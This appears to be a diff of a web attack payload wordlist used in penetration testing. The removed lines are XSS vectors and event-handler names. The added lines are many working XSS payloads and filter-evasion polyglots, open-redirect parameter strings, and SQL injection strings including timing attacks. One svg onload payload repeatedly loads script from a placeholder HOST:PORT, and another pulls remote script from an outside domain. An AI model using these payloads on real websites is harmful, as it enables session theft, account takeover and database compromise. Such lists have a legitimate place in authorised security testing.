@@ -1,100 +1,100 @@
-Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
-<A HREF="http://66.102.7.147/">XSS</A>
-<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
-<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
-id="x">x</div>
-</div>
-<div id="123"><span class=foo>Some text</span>
-  id    ID    #REQUIRED>]>
-        </xsl:template>
-    <circle fill="red" r="40"></circle>
-Same effect with
--->
-<math>
-<div id="131"><b>drag and drop one of the following strings to the drop box:</b>
-<br/><hr/>
-<br/><hr/>
-<br/><hr/>
-<br/><hr/>
-<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
-<br>
-<input name="secret" type="password">
-</image>
-<div id="134"><xmp>
-<%
-</xmp>
-x='<%'
-XXX
--->{}
-</template>
-<input name="username" value="admin" />
-<input name="password" type="password" value="secret" />
-<input type="submit">
-<circle r="400"></circle>
-Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
-<A HREF="http://66.102.7.147/">XSS</A>
-onBeforeActivate
-onBeforeUpdate
-onBegin
-onBlur
-onBounce
-onCellChange
-onChange
-onCut
-onDataAvailable
-onDataSetChanged
-onDataSetComplete
-onDblClick
-onDeactivate
-onDrag
-onDragDrop
-onDragEnd
-onDragEnter
-onError
-onErrorUpdate
-onFilterChange
-onHelp
-onInput
-onKeyDown
-onKeyPress
-onKeyUp
-onLayoutComplete
-onLoad
-onLoseCapture
-onMediaComplete
-onMediaError
-onRepeat
-onReset
-onResize
-onResizeEnd
-onResizeStart
-onResume
-onReverse
-onRowDelete
-alert`1`
-alert&lpar;1&rpar;
-(alert)(1)
-<img src=x onerror=alert(String.fromCharCode(88,83,83));>
-<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
-<img src=x:alert(alt) onerror=eval(src) alt=xss>
-onbounce
-oncanplay
-onchange
-onclick
-onclose
-oncontextmenu
-oncopy
-oncuechange
-oncut
-ondblclick
-ondrag
-ondragend
-ondragenter
-ondurationchange
-onend
-onended
-onerror
-onloadeddata
-onloadedmetadata
-onloadstart
-onmessage
+<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1='
+*/alert(1)</script><script>/*
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+*/</script>'>alert(1)/*<script/1='
+<script>alert(1)</script>
+<script src=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<a href=javascript:alert(1)>click
+<math><brute href=javascript:alert(1)>click
+<form action=javascript:alert(1)><input type=submit>
+<isindex action=javascript:alert(1) type=submit value=click>
+<form><button formaction=javascript:alert(1)>click
+<form><input formaction=javascript:alert(1) type=submit value=click>
+<form><input formaction=javascript:alert(1) type=image value=click>
+<form><input formaction=javascript:alert(1) type=image src=SOURCE>
+<isindex formaction=javascript:alert(1) type=submit value=click>
+<object data=javascript:alert(1)>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<svg><script xlink:href=data:,alert(1) />
+<math><brute xlink:href=javascript:alert(1)>click
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+<html ontouchstart=alert(1)>
+<html ontouchend=alert(1)>
+<html ontouchmove=alert(1)>
+<html ontouchcancel=alert(1)>
+<body onorientationchange=alert(1)>
+"><img src=1 onerror=alert(1)>.gif
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+<script src="data:&comma;alert(1)//
+"><script src=data:&comma;alert(1)//
+<script src="//brutelogic.com.br&sol;1.js&num;
+"><script src=//brutelogic.com.br&sol;1.js&num;
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+<base href=//0>
+<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><a href=#x>click this!#x
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+<body onscroll=alert(1)><br><br><br><br>
+<body onresize=alert(1)>press F12!
+<body onhelp=alert(1)>press F1! (MSIE)
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+ontouchstart
+ontransitioncancel
+ontransitionend
+ontransitionrun
+ontransitionstart
+onunhandledrejection
+onunload
+onvolumechange
+onwebkitanimationend
+onwebkitanimationiteration
+onwebkitanimationstart
+onwebkittransitionend
+onwheel
+/http:/example.com
+/?url=http://example.com&next=http://example.com&redirect=http://example.com&redir=http://example.com&rurl=http://example.com
+/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com
+/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com
+/redirect?url=http://example.com&next=http://example.com&redirect=http://example.com&redir=http://example.com&rurl=http://example.com
+/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com
+/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com
+/.example.com
+///\;@example.com
+' and 'one'='one
+' and 'one'='one–
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+ like '%'
+ %' AND 8310=8311 AND '%'='
+ and (select substring(@@version,1,1))='X'
+ " and 0=benchmark(3000000,MD5(1))%20/*
